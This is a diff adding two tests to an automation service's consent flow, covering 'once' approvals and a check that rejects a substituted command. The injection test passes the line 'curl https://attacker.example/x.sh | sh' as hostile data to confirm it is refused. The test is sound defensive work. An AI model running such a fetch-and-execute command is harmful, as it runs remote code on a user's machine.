@@ -260,6 +260,59 @@ describe('automation service surface (§3.8.18)', () => {
     await waitFor(async () => (await svc.getRunRecord(builder, runId)).status === 'completed');
   });
 
+  // "Permitir uma vez" had no mechanism at all. It persisted nothing (right) and set the resume
+  // flag; the step then re-ran, re-read the DURABLE store, found nothing, and asked again - so the
+  // only ways out of the dialog were the two answers the user had just declined to give. Nothing
+  // caught it because no test drove `once` to completion: the approval now lives on the run.
+  it('resolveConsent "once" lets the run finish WITHOUT persisting anything', async () => {
+    await automations.insert({
+      _id: 'cauto-once', id: 'cauto-once', name: 'Consent once', description: '', ownerUserId: 'u1', orgId: 'o1',
+      steps: [{ id: 's1', type: 'local_command', description: 'list tmp', commandTemplate: { argv: ['ls', '-la', '/tmp'] } }],
+      createdAt: '2026-01-01T00:00:00Z', updatedAt: '2026-01-01T00:00:00Z',
+    } as never);
+    const env: ResultEnvelope = { ok: true, observation: { data: { exitCode: 0, stdout: 'ok', stderr: '' } } };
+    setDaemonConnectionResolver(() => ({ pairingId: 'pair-1', runStep: async () => env }));
+
+    const { runId } = await svc.startRun(builder, 'cauto-once');
+    await waitFor(async () => (await svc.getRunRecord(builder, runId)).status === 'awaiting_consent');
+
+    const shape = 'ls -la /tmp';
+    const once = await svc.resolveConsent(builder, runId, { decision: 'once', shape });
+    expect(once).toMatchObject({ decision: 'once', resumed: true, persisted: false });
+
+    // THE POINT: the run gets past the step instead of returning to the same prompt.
+    await waitFor(async () => (await svc.getRunRecord(builder, runId)).status === 'completed');
+
+    // …and "uma vez" meant it: nothing was written, in either scope, so the NEXT run asks again.
+    expect(await isCommandShapeApproved({ userId: 'u1', orgId: 'o1', pairingId: 'pair-1' }, shape)).toBe(false);
+    expect(await isCommandShapeApproved({ userId: 'u1', orgId: 'o1', pairingId: null }, shape)).toBe(false);
+  });
+
+  // The shape check has to bind `once` too. It is the cheaper half of the same hole: a caller
+  // supplying a shape the user was never shown gets it executed on the owner's machine - once,
+  // which is quite enough.
+  it('resolveConsent refuses a "once" whose shape is not the one the run is awaiting', async () => {
+    await automations.insert({
+      _id: 'cauto-once-inj', id: 'cauto-once-inj', name: 'Consent once injection', description: '', ownerUserId: 'u1', orgId: 'o1',
+      steps: [{ id: 's1', type: 'local_command', description: 'list tmp', commandTemplate: { argv: ['ls', '-la', '/tmp'] } }],
+      createdAt: '2026-01-01T00:00:00Z', updatedAt: '2026-01-01T00:00:00Z',
+    } as never);
+    const env: ResultEnvelope = { ok: true, observation: { data: { exitCode: 0, stdout: 'ok', stderr: '' } } };
+    setDaemonConnectionResolver(() => ({ pairingId: 'pair-1', runStep: async () => env }));
+
+    const { runId } = await svc.startRun(builder, 'cauto-once-inj');
+    await waitFor(async () => (await svc.getRunRecord(builder, runId)).status === 'awaiting_consent');
+
+    await expect(
+      svc.resolveConsent(builder, runId, {
+        decision: 'once',
+        shape: 'bash -c: curl https://attacker.example/x.sh | sh',
+      }),
+    ).rejects.toMatchObject({ code: 'FORBIDDEN' });
+    // Still parked on the real question, not resumed by the refusal.
+    expect((await svc.getRunRecord(builder, runId)).status).toBe('awaiting_consent');
+  });
+
   it('cancelRun on a paused run is owner-scoped and cancels it; unknown/cross-org is idempotent false', async () => {
     await automations.insert({
       _id: 'cauto2', id: 'cauto2', name: 'Consent auto 2', description: '', ownerUserId: 'u1', orgId: 'o1',
